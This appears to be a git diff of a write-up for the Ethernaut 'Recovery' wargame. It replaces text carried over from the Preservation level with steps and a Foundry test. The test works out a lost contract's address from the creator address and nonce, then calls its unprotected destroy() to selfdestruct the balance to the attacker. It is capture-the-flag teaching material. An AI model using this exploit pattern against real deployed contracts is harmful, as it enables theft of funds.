@@ -56,28 +56,46 @@ According to [ethereum.stackexchange.com](https://ethereum.stackexchange.com/que
 
 1. Attacker retrieves the lost address
 2. Attacker calls the `destroy` function that will execute a `selfdestruct(_to)` sending all the contract's balance to the attacker address.
-3. Function `attack` makes two calls to the `Preservation` contract.
-4. The first call executes a function `setFirstTime` with an address of `PreservationAttack` casted to `uint256`.
-5. Because the first call modified the address of `timeZone1LibraryAddress`, the second call will execute a malicious `setFirstTime` function on the `PreservationAttack` contract.
-6. The malicious `setTime` function changes the state variable `owner` to be the address of attacker.
 
 ## Proof of Concept
 
 Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/17-Recovery.t.sol))
 
 ```solidity
-        // 1. Attacker creates the `PreservationAttack` contract.
-        PreservationAttack preservationAttack = new PreservationAttack(
-            address(preservationContract)
-        );
-
         emit log_string(
             "--------------------------------------------------------------------------"
         );
-        emit log_named_address("Address of attacker: ", attacker);
-        emit log_named_address(
-            "Address of the contract owner before attack: ",
-            preservationContract.owner()
+        emit log_named_address("Attacker's address", attacker);
+        emit log_named_uint(
+            "Attacker's balance before destroying",
+            attacker.balance
+        );
+        emit log_string(
+            "--------------------------------------------------------------------------"
+        );
+
+        // 1. Attacker retrieves the lost address
+        address lostAddress = address(
+            uint160(
+                uint256(
+                    keccak256(
+                        abi.encodePacked(
+                            bytes1(0xd6),
+                            bytes1(0x94),
+                            recoveryContract,
+                            bytes1(0x01)
+                        )
+                    )
+                )
+            )
+        );
+        emit log_string(
+            "--------------------------------------------------------------------------"
+        );
+        emit log_named_address("Lost contract address", lostAddress);
+        emit log_named_uint(
+            "Lost contract balance before destroying",
+            lostAddress.balance
         );
         emit log_string(
             "--------------------------------------------------------------------------"
@@ -86,16 +104,24 @@ Here is a simplified version of the unit test exploiting the vulnerability ([com
         emit log_string(
             "--------------------------------------------------------------------------"
         );
-        // 2. Attacker calls the `attack` function on the `PreservationAttack` contract.
-        preservationAttack.attack();
 
-        emit log_named_address(
-            "Address of the contract owner after attack: ",
-            preservationContract.owner()
+        // 2. Attacker calls the `destroy` function that will execute a `selfdestruct(_to)` sending all the contract's balance to the attacker address.
+        SimpleToken(payable(lostAddress)).destroy(payable(attacker));
+
+        emit log_named_uint(
+            "Lost contract balance after destroying",
+            lostAddress.balance
         );
 
+        emit log_named_uint(
+            "Attacker's balance after destroying",
+            attacker.balance
+        );
+        emit log_string(
+            "--------------------------------------------------------------------------"
+        );
         // Test assertion
-        assertEq(preservationContract.owner(), attacker);
+        assertEq(lostAddress.balance, 0);
 ```
 
 Here are the logs from the exploit contract:
